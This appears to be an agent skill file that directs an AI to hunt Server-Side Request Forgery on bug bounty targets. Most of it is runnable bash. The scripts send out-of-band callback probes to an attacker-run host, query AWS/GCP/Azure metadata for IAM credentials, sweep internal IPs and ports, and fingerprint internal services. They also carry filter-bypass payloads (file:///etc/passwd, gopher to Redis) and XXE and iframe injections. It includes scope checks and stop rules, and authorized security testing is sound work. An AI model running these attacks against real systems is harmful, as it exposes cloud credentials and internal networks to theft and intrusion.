---
name: ssrf-hunter
description: Systematically hunt for Server-Side Request Forgery vulnerabilities across all attack surfaces: URL parameters, webhook endpoints, file import/export, PDF/image renderers, integrations, and internal proxy abuse. Covers blind SSRF via OOB detection, cloud metadata exfiltration (AWS/GCP/Azure), internal network pivoting, and filter bypass techniques. Use this skill whenever a target accepts URLs, hostnames, IP addresses, or any input that the server may use to make outbound requests. Trigger on phrases like "test for SSRF", "ssrf-hunter", "server-side request forgery", "check URL parameter", "webhook testing", "any SSRF surface", or when recon reveals parameters named url, uri, link, src, dest, redirect, proxy, fetch, callback, host, domain, target, to, load, image, file, or resource.
---

# SSRF Hunter Skill

You are hunting for Server-Side Request Forgery vulnerabilities. SSRF is one of the highest-value bug classes in modern cloud-hosted applications: a successful hit can expose AWS IAM credentials, internal service endpoints, RCE via internal admin APIs, or pivot into the internal network. The attack surface is wider than most hunters check — it extends far beyond the obvious `?url=` parameter into file uploads, integrations, webhooks, PDF renderers, and GraphQL URL fields.

Run all phases in order. Blind SSRF requires OOB infrastructure — set up your Burp Collaborator or interactsh before Phase 1. A URL that returns nothing to the browser may still trigger a backend request you can only see via OOB.

---

## Prerequisites

- Burp Collaborator URL or `interactsh` server ready for blind OOB detection
- Kali tools: `curl`, `ffuf`, `python3`, `jq`
- Two accounts (attacker + victim) if testing authenticated endpoints
- All target hosts confirmed IN SCOPE via `/scope-checker` before active testing

```bash
# Start interactsh for OOB detection if not using Burp Collaborator
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
/home/kali/go/bin/interactsh-client &
# Note the generated URL: e.g. abc123.oast.fun — use this as your OOB callback
export OOB_URL="abc123.oast.fun"
```

---

## Phase 1 — Surface Enumeration

### Step 1.1 — Identify URL-Accepting Parameters

Scan all collected endpoints and JS-extracted parameters for SSRF-prone inputs:

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/ssrf

# Search all recon files for SSRF-prone parameter names
SSRF_PARAMS="url|uri|link|src|source|dest|destination|redirect|proxy|fetch"
SSRF_PARAMS+="|callback|host|domain|target|to|load|image|file|resource|path"
SSRF_PARAMS+="|data|input|endpoint|service|api|remote|request|page|site|ref"

grep -iEh "[?&](${SSRF_PARAMS})=" \
  $TARGET_DIR/recon/api/all-endpoints.txt \
  $TARGET_DIR/recon/api/katana-crawl.txt \
  $TARGET_DIR/recon/js/endpoints-extracted.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/ssrf/candidate-params.txt

echo "[*] SSRF candidate parameters found: $(wc -l < $TARGET_DIR/recon/ssrf/candidate-params.txt)"
cat $TARGET_DIR/recon/ssrf/candidate-params.txt
```

### Step 1.2 — Identify SSRF-Prone Features

Beyond URL parameters, manually identify these high-signal features from recon:

```bash
# Search for feature signals in recon files
grep -riEh --include="*.txt" --include="*.md" --include="*.json" \
  "webhook|import.url|import.link|export|pdf.gen|pdf.render|screenshot\
  |thumbnail|preview|proxy|fetch.*url|remote.*image|social.*preview\
  |open.graph|link.preview|slack.integration|zapier|xml.import|csv.import\
  |feed|rss|atom|sitemap" \
  $TARGET_DIR/recon/ 2>/dev/null | sort -u | head -60
```

For each signal found, record the feature as an SSRF candidate:

| Feature Type | Why SSRF-prone | Where to look |
|---|---|---|
| Webhook configuration | Server fetches your URL to send events | Settings, integrations, developer portal |
| File/URL import | Server fetches a remote file by URL | Import wizard, bulk upload, CSV/XML import |
| PDF / screenshot renderer | Headless browser renders a URL server-side | Invoice generator, report export, link preview |
| Social/link preview | Server fetches the URL to extract OG metadata | Post composer, URL shortener, share feature |
| Avatar / image upload via URL | Server fetches and re-hosts the image | Profile settings, media upload |
| XML / SOAP external entities | XML parser fetches external DTD | API accepting XML body |
| OAuth / SSO redirect | Server-side validation of redirect_uri host | Auth flow, app registration |
| Internal proxy / gateway | Service relays requests to internal APIs | API gateway, reverse proxy, service mesh |

Save each candidate to:
```bash
cat >> $TARGET_DIR/recon/ssrf/candidate-features.txt << 'EOF'
[Feature type] | [URL or endpoint] | [Parameter or field] | [Notes]
EOF
```

---

## Phase 2 — Basic SSRF Detection (Out-of-Band)

### Step 2.1 — OOB Callback Probe

For every candidate parameter and feature, inject your OOB URL and observe for DNS/HTTP callbacks:

```bash
OOB="http://$OOB_URL"

# Test each candidate URL parameter
while IFS= read -r ENDPOINT; do
  # Extract param name and base URL
  PARAM=$(echo "$ENDPOINT" | grep -oP '(?<=[?&])[a-z_]+(?==)' | head -1)
  BASE=$(echo "$ENDPOINT" | sed 's/?.*//;s/#.*//')

  RESPONSE=$(curl -sk -w "\n%{http_code}" \
    -G "$BASE" --data-urlencode "${PARAM}=${OOB}" \
    -H "Cookie: $SESSION_COOKIE" --max-time 10)

  HTTP_CODE=$(echo "$RESPONSE" | tail -1)
  echo "[${HTTP_CODE}] ${PARAM}= on ${BASE}"
done < $TARGET_DIR/recon/ssrf/candidate-params.txt
```

Watch your Burp Collaborator / interactsh panel. Any DNS or HTTP hit within 10 seconds of a request confirms blind SSRF.

### Step 2.2 — Protocol Variety Probing

Do not limit OOB probes to HTTP. Some servers restrict HTTP but allow other schemes:

```bash
BASE_URL="[target endpoint]"
PARAM="[parameter name]"
SESSION="[auth cookie]"

PROTOCOLS=(
  "http://$OOB_URL/http-probe"
  "https://$OOB_URL/https-probe"
  "http://$OOB_URL:80/port-80"
  "http://$OOB_URL:8080/port-8080"
  "http://$OOB_URL:443/port-443"
)

for PROTO in "${PROTOCOLS[@]}"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    -G "$BASE_URL" --data-urlencode "${PARAM}=${PROTO}" \
    -H "Cookie: $SESSION" --max-time 10)
  echo "[$STATUS] $PROTO"
done
```

### Step 2.3 — In-Band SSRF (Response Reflection)

For parameters where the server response may reflect fetched content:

```bash
# Probe a URL that returns known content and check if it appears in the response
TEST_URL="http://example.com"  # deterministic, public

curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=${TEST_URL}" \
  -H "Cookie: $SESSION" --max-time 15 | \
  grep -i "example domain\|iana\|illustrative" && \
  echo "[+] IN-BAND SSRF CONFIRMED: fetched content reflected in response" || \
  echo "[-] No in-band reflection detected"
```

---

## Phase 3 — Cloud Metadata Exfiltration

If OOB confirms the server is making requests, escalate immediately to cloud metadata endpoints. These are the highest-impact SSRF targets — they can yield IAM credentials with account-level access.

**Only run this phase if SSRF is already confirmed via Phase 2.**

### Step 3.1 — AWS IMDSv1 Metadata

```bash
BASE_URL="[vulnerable endpoint]"
PARAM="[vulnerable parameter]"
SESSION="[auth cookie]"

# Step 1: Check if metadata service responds
curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: $SESSION" --max-time 10

# Step 2: Get IAM role name
curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "Cookie: $SESSION" --max-time 10

# Step 3: Get credentials for the role (replace ROLE_NAME with value from Step 2)
curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME" \
  -H "Cookie: $SESSION" --max-time 10

# Step 4: Additional high-value metadata
for PATH in \
  "latest/meta-data/hostname" \
  "latest/meta-data/local-ipv4" \
  "latest/meta-data/public-ipv4" \
  "latest/meta-data/ami-id" \
  "latest/user-data" \
  "latest/dynamic/instance-identity/document"; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=http://169.254.169.254/${PATH}" \
    -H "Cookie: $SESSION" --max-time 10)
  echo "=== $PATH ==="
  echo "$RESULT" | head -10
done
```

**If IAM credentials are returned:** Stop immediately. Document the exact request, the response (redact the actual secret values), and escalate as Critical. Do not use the credentials for anything. Do not test further.

### Step 3.2 — AWS IMDSv2 (Token-Required)

IMDSv2 requires a PUT request to obtain a token before metadata is readable. Many SSRF vectors support only GET — but some do not:

```bash
# IMDSv2 requires a two-step flow. Test if the SSRF vector supports headers:
# Step 1 via SSRF: PUT http://169.254.169.254/latest/api/token with TTL header
# This is only exploitable if the server-side HTTP client forwards custom headers
# or the SSRF vector supports specifying request method and headers

# If the SSRF endpoint supports method and header specification (e.g. SOAP/XML injection):
# Document the vector as "IMDSv2 potentially exploitable" and flag for manual PoC
echo "[INFO] IMDSv2 exploitation requires server to make a PUT request with Metadata header."
echo "[INFO] Test manually if the SSRF vector allows request method control."
```

### Step 3.3 — GCP Metadata

```bash
for PATH in \
  "computeMetadata/v1/instance/service-accounts/default/token" \
  "computeMetadata/v1/instance/hostname" \
  "computeMetadata/v1/project/project-id" \
  "computeMetadata/v1/instance/attributes/"; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=http://metadata.google.internal/${PATH}" \
    -H "Cookie: $SESSION" --max-time 10)
  [ -n "$RESULT" ] && echo "[GCP:${PATH}] $RESULT" | head -5
done
```

### Step 3.4 — Azure IMDS

```bash
RESULT=$(curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Cookie: $SESSION" \
  --max-time 10)
echo "[Azure IMDS] $RESULT" | head -20

# Azure managed identity token
RESULT=$(curl -sk -G "$BASE_URL" \
  --data-urlencode "${PARAM}=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Cookie: $SESSION" --max-time 10)
[ -n "$RESULT" ] && echo "[Azure Token] $RESULT" | head -10
```

---

## Phase 4 — Internal Network Pivoting

### Step 4.1 — Internal IP Range Sweep

If the server is in a cloud/private network, probe common internal IP ranges:

```bash
mkdir -p $TARGET_DIR/recon/ssrf/internal

# Common internal service ports
INTERNAL_IPS=("10.0.0.1" "172.16.0.1" "192.168.1.1" "127.0.0.1" "localhost")
COMMON_PORTS=("80" "8080" "8443" "8888" "9200" "9300" "6379" "5432" "3306" "27017" "11211" "2181" "7001" "4848")

for IP in "${INTERNAL_IPS[@]}"; do
  for PORT in "${COMMON_PORTS[@]}"; do
    RESPONSE=$(curl -sk -o /tmp/ssrf-probe.tmp -w "%{http_code}|%{size_download}|%{time_total}" \
      -G "$BASE_URL" \
      --data-urlencode "${PARAM}=http://${IP}:${PORT}/" \
      -H "Cookie: $SESSION" --max-time 5 2>/dev/null)
    CODE=$(echo "$RESPONSE" | cut -d'|' -f1)
    SIZE=$(echo "$RESPONSE" | cut -d'|' -f2)
    TIME=$(echo "$RESPONSE" | cut -d'|' -f3)
    # Flag non-timeout responses (timeout = service closed, fast 200/redirect = open)
    if [ "$CODE" != "000" ] && [ "$SIZE" -gt 0 ] 2>/dev/null; then
      echo "[OPEN] ${IP}:${PORT} — HTTP ${CODE}, ${SIZE}b, ${TIME}s"
      head -5 /tmp/ssrf-probe.tmp
      echo "---"
    fi
  done
done | tee $TARGET_DIR/recon/ssrf/internal/open-services.txt

echo "[*] Internal services detected: $(grep -c OPEN $TARGET_DIR/recon/ssrf/internal/open-services.txt 2>/dev/null || echo 0)"
```

### Step 4.2 — Service Fingerprinting via SSRF Response

For each open internal service found, attempt to fingerprint it:

```bash
# Common internal service paths worth probing
declare -A SERVICE_PATHS
SERVICE_PATHS["elasticsearch"]="http://IP:9200/_cat/indices"
SERVICE_PATHS["kibana"]="http://IP:5601/api/status"
SERVICE_PATHS["redis"]="http://IP:6379/"  # will error but confirm open
SERVICE_PATHS["kubernetes-api"]="https://IP:6443/api/v1/namespaces"
SERVICE_PATHS["consul"]="http://IP:8500/v1/catalog/services"
SERVICE_PATHS["vault"]="http://IP:8200/v1/sys/health"
SERVICE_PATHS["prometheus"]="http://IP:9090/metrics"
SERVICE_PATHS["grafana"]="http://IP:3000/api/health"
SERVICE_PATHS["jenkins"]="http://IP:8080/api/json"
SERVICE_PATHS["docker"]="http://IP:2375/containers/json"

for SERVICE in "${!SERVICE_PATHS[@]}"; do
  PATH_TEMPLATE=${SERVICE_PATHS[$SERVICE]}
  # Replace IP with each discovered open IP from Step 4.1
  for IP in $(grep OPEN $TARGET_DIR/recon/ssrf/internal/open-services.txt | grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u); do
    TARGET_PATH=$(echo "$PATH_TEMPLATE" | sed "s/IP/$IP/")
    RESULT=$(curl -sk -G "$BASE_URL" \
      --data-urlencode "${PARAM}=${TARGET_PATH}" \
      -H "Cookie: $SESSION" --max-time 8)
    [ -n "$RESULT" ] && {
      echo "[SERVICE:$SERVICE @ $IP] $(echo $RESULT | head -c 200)"
      echo "$SERVICE|$IP|$RESULT" >> $TARGET_DIR/recon/ssrf/internal/service-responses.txt
    }
  done
done
```

---

## Phase 5 — Filter Bypass Techniques

When a basic payload is blocked, the application is filtering. Work through this bypass ladder systematically.

### Step 5.1 — IP Representation Bypasses

```bash
BASE_TARGET="169.254.169.254"  # adjust to your blocked target

# For each representation, test against the vulnerable parameter
BYPASSES=(
  # Decimal IP
  "http://2852039166/latest/meta-data/"
  # Hex IP
  "http://0xa9fea9fe/latest/meta-data/"
  # Octal IP
  "http://0251.0376.0251.0376/latest/meta-data/"
  # Mixed encoding
  "http://169.254.169.254/latest/meta-data/"
  # IPv6 link-local
  "http://[::ffff:169.254.169.254]/latest/meta-data/"
  "http://[fd00::1]/"
  # Localhost variants
  "http://0.0.0.0/"
  "http://0/"
  "http://127.0.0.1/"
  "http://127.1/"
  "http://127.0.1/"
  "http://[::1]/"
  "http://localhost/"
  "http://localtest.me/"
  # Domain redirect tricks
  "http://169.254.169.254.nip.io/latest/meta-data/"
  "http://1.1.1.1&@169.254.169.254/latest/meta-data/"
  "http://1.1.1.1 @169.254.169.254/latest/meta-data/"
)

for BP in "${BYPASSES[@]}"; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${BP}" \
    -H "Cookie: $SESSION" --max-time 8)
  [ -n "$RESULT" ] && echo "[BYPASS-HIT] $BP" && echo "$RESULT" | head -3
done | tee $TARGET_DIR/recon/ssrf/filter-bypass-results.txt
```

### Step 5.2 — URL Scheme and Protocol Bypasses

```bash
# Some filters check for http:// but not other schemes
SCHEME_BYPASSES=(
  "dict://127.0.0.1:6379/info"
  "ftp://127.0.0.1/"
  "file:///etc/passwd"
  "file:///proc/net/tcp"
  "ldap://127.0.0.1:389/"
  "gopher://127.0.0.1:6379/_INFO%0d%0a"
  "jar:http://$OOB_URL!/"
  "tftp://$OOB_URL:69/test"
)

for SCHEME in "${SCHEME_BYPASSES[@]}"; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${SCHEME}" \
    -H "Cookie: $SESSION" --max-time 8)
  [ -n "$RESULT" ] && echo "[SCHEME-HIT] $SCHEME" && echo "$RESULT" | head -5
done

# CRITICAL: file:// scheme returning /etc/passwd = LFI via SSRF → Critical severity
# gopher:// returning Redis data = RCE potential → Critical severity
```

### Step 5.3 — Redirect-Based SSRF

Some filters check the initial URL but not where it redirects to. Host a redirect at your OOB URL:

```bash
# Set up a redirect server on your OOB infrastructure
# Option A: Python one-liner (run on a VPS or use a redirect service)
# python3 -c "import http.server; ..."

# Option B: Use interactsh with a custom redirect payload
# Point the parameter to your controlled URL that returns 301 to 169.254.169.254

# Test using known public redirect services as a proxy
REDIRECT_TARGETS=(
  "https://your-redirector.example.com/to?url=http://169.254.169.254/latest/meta-data/"
  "http://$OOB_URL/redirect?target=http://169.254.169.254/"
)

for RT in "${REDIRECT_TARGETS[@]}"; do
  RESULT=$(curl -sk -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${RT}" \
    -H "Cookie: $SESSION" --max-time 10)
  [ -n "$RESULT" ] && echo "[REDIRECT-HIT] $(echo $RESULT | head -c 200)"
done
```

### Step 5.4 — Host Header / SNI Injection

For targets where the SSRF vector is the Host header or a forwarded-host style parameter:

```bash
# Test Host header injection pointing to internal resource
curl -sk "$TARGET_URL" \
  -H "Host: 169.254.169.254" \
  -H "Cookie: $SESSION" --max-time 8

# Test via X-Forwarded-Host and similar headers
for HEADER in "X-Forwarded-Host" "X-Forwarded-For" "X-Real-IP" "X-Original-URL" "X-Rewrite-URL"; do
  RESULT=$(curl -sk "$TARGET_URL" \
    -H "${HEADER}: 169.254.169.254" \
    -H "Cookie: $SESSION" --max-time 8)
  [ -n "$RESULT" ] && echo "[HEADER:$HEADER] $(echo $RESULT | head -c 100)"
done
```

---

## Phase 6 — Advanced Surfaces

### Step 6.1 — Webhook / Callback URL Testing

```bash
# Find webhook configuration in the target app
# Common locations: Settings > Integrations, Developer Portal, API settings

# Register your OOB URL as a webhook endpoint
curl -sk -X POST "$BASE_URL/api/webhooks" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION" \
  -d "{\"url\": \"http://$OOB_URL/webhook-ssrf-test\", \"events\": [\"*\"]}" | \
  python3 -m json.tool

# Trigger an event that fires the webhook (e.g. create a resource, submit a form)
# Observe OOB callback — confirm server-to-server request
# Then pivot to internal targets using bypass techniques from Phase 5
```

### Step 6.2 — PDF / Screenshot Renderer SSRF

Headless browsers often run with internal network access and process arbitrary HTML:

```bash
# If the target generates PDFs or screenshots from user-supplied URLs/HTML:

# Test 1: Direct URL input
curl -sk -X POST "$BASE_URL/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION" \
  -d "{\"url\": \"http://$OOB_URL/pdf-ssrf\"}" | python3 -m json.tool

# Test 2: HTML injection into a rendered field (iframe, image src, script src)
# If the app renders user-controlled HTML into a PDF:
HTML_PAYLOAD='<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>'
curl -sk -X POST "$BASE_URL/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION" \
  -d "{\"html\": $(echo $HTML_PAYLOAD | python3 -c 'import sys,json; print(json.dumps(sys.stdin.read()))')}" \
  -o /tmp/rendered.pdf

# Extract text from rendered PDF to check if metadata was included
python3 -c "
try:
    import pdfplumber
    with pdfplumber.open('/tmp/rendered.pdf') as pdf:
        for page in pdf.pages:
            print(page.extract_text())
except ImportError:
    print('[INFO] Install pdfplumber: pip3 install pdfplumber')
" 2>/dev/null
```

### Step 6.3 — XML / SOAP External Entity (OOB XXE as SSRF vector)

If the application accepts XML input, XXE is a direct path to SSRF:

```bash
# Test XML endpoints for external entity processing
XXE_PAYLOAD='<?xml version="1.0" encoding="UTF-8"?>'
XXE_PAYLOAD+='<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://'"$OOB_URL"'/xxe-ssrf">]>'
XXE_PAYLOAD+='<root><data>&xxe;</data></root>'

curl -sk -X POST "$BASE_URL" \
  -H "Content-Type: application/xml" \
  -H "Cookie: $SESSION" \
  -d "$XXE_PAYLOAD" | head -50

# OOB hit on interactsh confirms OOB XXE (= blind SSRF via XXE)
# If reflected — attempt file read: SYSTEM "file:///etc/passwd"
```

### Step 6.4 — URL Import (CSV, Sitemap, RSS, Feed)

```bash
# Test file import features that accept a URL
# CSV import with URL column
curl -sk -X POST "$BASE_URL/api/import" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION" \
  -d "{\"import_url\": \"http://$OOB_URL/import-ssrf-test\"}" | python3 -m json.tool

# RSS/Atom feed subscription
curl -sk -X POST "$BASE_URL/api/subscribe" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION" \
  -d "{\"feed_url\": \"http://$OOB_URL/feed-ssrf-test\"}" | python3 -m json.tool
```

---

## Validation Standard

Do not log a Finding until the appropriate bar is met for each SSRF variant:

| SSRF Type | Minimum evidence to log as Finding |
|---|---|
| Blind SSRF | OOB DNS or HTTP callback confirmed with server-initiated request (not from your own IP) |
| In-band SSRF | Fetched content reflected in response — not just a status code change |
| Cloud metadata SSRF | Actual metadata endpoint response returned (hostname, IP, IAM role name) — not just OOB hit |
| IAM credential exfiltration | Role name confirmed via SSRF. **Stop here.** Do not retrieve actual credentials — the role name is sufficient for Critical escalation |
| Internal service SSRF | Service response (even partial) returned via SSRF — confirms internal network access |
| LFI via SSRF (`file://`) | File contents returned (redact secrets from PoC) |
| Redis/Gopher SSRF | Command response returned — document the RCE potential, do not execute destructive commands |

**For all findings:** Document the exact request (method, URL, headers, body), the exact response, and the exact evidence of server-side request (OOB log timestamp or response content).

---

## Output Summary

All output written to `$TARGET_DIR/recon/ssrf/`:

| File | Contents |
|---|---|
| `candidate-params.txt` | URL parameters identified as SSRF-prone |
| `candidate-features.txt` | Application features with SSRF attack surface |
| `filter-bypass-results.txt` | Filter bypass attempts and any hits |
| `internal/open-services.txt` | Internal IP:port combinations that responded |
| `internal/service-responses.txt` | Fingerprinted internal services with raw response snippets |

---

## Severity Reference

| Finding | Severity |
|---|---|
| IAM credential retrieval (AWS/GCP/Azure) | Critical |
| Internal service access (Kubernetes API, Consul, Vault, Docker API) | Critical |
| RCE via gopher:// to Redis / memcached | Critical |
| File read via `file://` scheme (`/etc/passwd`, `/proc/self/environ`) | High–Critical |
| Cloud metadata access (hostname, instance identity, no credentials) | High |
| Internal network port scan / service fingerprinting confirmed | High |
| Blind SSRF (OOB only, no internal data returned) | Medium–High |
| PDF/screenshot renderer SSRF (OOB confirmed, no data exfiltration) | Medium |
| Webhook SSRF (OOB only) | Low–Medium |
| SSRF to public IPs only (no internal / metadata access) | Informational |

---

## Guiding Principles

- **OOB infrastructure first.** A blind SSRF with no callback infrastructure is invisible. Set up interactsh or Burp Collaborator before sending a single probe. A missed SSRF OOB hit is a missed finding.
- **IAM credentials are a hard stop.** If a metadata endpoint returns an IAM role name, that is sufficient to prove the Critical. Do not retrieve `AccessKeyId`, `SecretAccessKey`, or `Token` values in the PoC. The role name and the metadata endpoint URL are the evidence. Document and stop.
- **Blind SSRF is Medium at minimum, not Informational.** An OOB hit confirms the server is making outbound requests based on user input. That is a finding regardless of whether internal data is returned. The impact chain starts there.
- **Do not brute-force the internal IP range.** A sweep of a /24 range with 50ms intervals is sufficient to map open services. Full /8 or /16 range scanning is out of scope, disruptive, and unnecessary — the PoC only requires demonstrating one internal service is reachable.
- **`file://` and `gopher://` scheme hits are immediate Critical escalation candidates.** File read from /etc/passwd or /proc/self/environ, and Redis command execution via gopher, are not "interesting leads" — they are Critical findings that require immediate PoC documentation and submission.
- **CORS misconfigurations are not SSRF.** A response with `Access-Control-Allow-Origin: *` is a different finding. SSRF requires the server to make an outbound request — not just to reflect a header.
- **Run /triager before submitting.** SSRF to public IPs only (no internal/cloud access confirmed) is Informational on most programs. Always confirm the request reaches an internal or metadata target before escalating beyond Medium.
